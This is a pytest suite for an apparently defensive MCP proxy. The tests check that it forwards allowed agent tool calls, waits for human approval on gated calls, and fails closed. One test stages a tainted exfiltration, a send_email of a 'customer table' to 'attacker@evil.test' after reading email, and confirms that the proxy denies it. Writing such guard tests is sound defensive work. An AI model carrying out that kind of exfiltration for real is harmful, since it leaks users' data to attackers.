"""Drive the real stdio proxy as a subprocess, the way an MCP client would."""
import json
import os
import subprocess
import sys
import threading
import time
from pathlib import Path

import pytest

from backend.graph.client import session_graph_name
from backend.guard import approvals
from tests.conftest import demo_spec_dict, unique

ROOT = Path(__file__).resolve().parent.parent
FAKE = str(ROOT / "tests" / "fake_mcp_server.py")


class Client:
    def __init__(self, stack, session, approve="deny", log=None, timeout="5"):
        env = {**os.environ, "BLASTRADIUS_LLM": "mock", "PYTHONPATH": str(ROOT)}
        if log:
            env["FAKE_MCP_LOG"] = str(log)
        self.p = subprocess.Popen(
            [sys.executable, "-m", "backend.guard.mcp_proxy", "--stack", stack,
             "--session", session, "--approve", approve, "--approval-timeout", timeout,
             "--", sys.executable, FAKE],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
            cwd=ROOT, env=env, bufsize=1,
        )
        self.n = 0

    def send(self, method, params=None):
        self.n += 1
        self.p.stdin.write(json.dumps({"jsonrpc": "2.0", "id": self.n, "method": method,
                                       "params": params or {}}) + "\n")
        self.p.stdin.flush()
        return self.n

    def recv(self):
        return json.loads(self.p.stdout.readline())

    def call(self, name, args=None):
        self.send("tools/call", {"name": name, "arguments": args or {}})
        return self.recv()

    def close(self):
        self.p.stdin.close()
        self.p.wait(timeout=15)
        return self.p.stderr.read()


@pytest.fixture
def setup(load_demo, track_graph, tmp_path):
    sess = unique("px")
    track_graph(session_graph_name(sess))
    return load_demo("vulnerable"), sess, tmp_path / "child.log"


def test_proxy_forwards_protocol_and_allowed_calls(setup):
    stack, sess, log = setup
    c = Client(stack, sess, log=log)
    c.send("initialize")
    assert c.recv()["result"]["serverInfo"]["name"] == "fake"
    c.send("tools/list")
    assert len(c.recv()["result"]["tools"]) == 3
    r = c.call("db_query", {"sql": "select 1"})
    assert r["result"]["content"][0]["text"] == "ran db_query"
    c.close()
    assert log.read_text().split() == ["db_query"]


def test_proxy_blocks_tainted_exfil_and_child_never_sees_it(setup):
    stack, sess, log = setup
    c = Client(stack, sess, log=log)
    assert "ran read_email" in c.call("read_email")["result"]["content"][0]["text"]
    r = c.call("send_email", {"to": "attacker@evil.test", "body": "customer table"})
    assert r["result"]["isError"] is True
    assert "BlastRadius DENY" in r["result"]["content"][0]["text"]
    assert r["result"]["_blastradius"]["decision"] == "DENY"
    c.close()
    assert log.read_text().split() == ["read_email"], "denied call must not reach the child"


def test_proxy_escalate_waits_for_ui_approval(load_demo, track_graph, tmp_path):
    data = demo_spec_dict("vulnerable")
    for s in data["servers"]:
        for t in s["tools"]:
            if t["name"] == "send_email":
                t["gated"] = True
    stack = load_demo("vulnerable", servers=data["servers"])
    sess = unique("pe")
    track_graph(session_graph_name(sess))
    log = tmp_path / "child.log"
    c = Client(stack, sess, approve="ui", log=log, timeout="10")

    def human():
        for _ in range(60):
            p = [x for x in approvals.pending() if x["session"] == sess]
            if p:
                approvals.resolve(sess, p[0]["seq"], approve=True)
                return
            time.sleep(0.1)

    th = threading.Thread(target=human)
    th.start()
    r = c.call("send_email", {"to": "customer@example.com"})
    th.join()
    assert "ran send_email" in r["result"]["content"][0]["text"]
    c.close()
    assert log.read_text().split() == ["send_email"]


def test_proxy_escalate_rejected_by_human(load_demo, track_graph, tmp_path):
    data = demo_spec_dict("vulnerable")
    for s in data["servers"]:
        for t in s["tools"]:
            if t["name"] == "send_email":
                t["gated"] = True
    stack = load_demo("vulnerable", servers=data["servers"])
    sess = unique("pr")
    track_graph(session_graph_name(sess))
    log = tmp_path / "child.log"
    c = Client(stack, sess, approve="deny", log=log)
    r = c.call("send_email", {"to": "customer@example.com"})
    assert r["result"]["isError"] is True and "rejected by a human" in r["result"]["content"][0]["text"]
    c.close()
    assert not log.exists()


def test_proxy_prints_mock_mode_banner(setup):
    stack, sess, _ = setup
    c = Client(stack, sess)
    c.send("tools/list")
    c.recv()
    assert "MOCK MODE" in c.close()


def test_proxy_fails_closed_for_unknown_stack(track_graph):
    sess = unique("pu")
    track_graph(session_graph_name(sess))
    c = Client("no-such-stack", sess)
    r = c.call("read_email")
    assert r["result"]["isError"] is True and "fail closed" in r["result"]["content"][0]["text"]
    c.close()
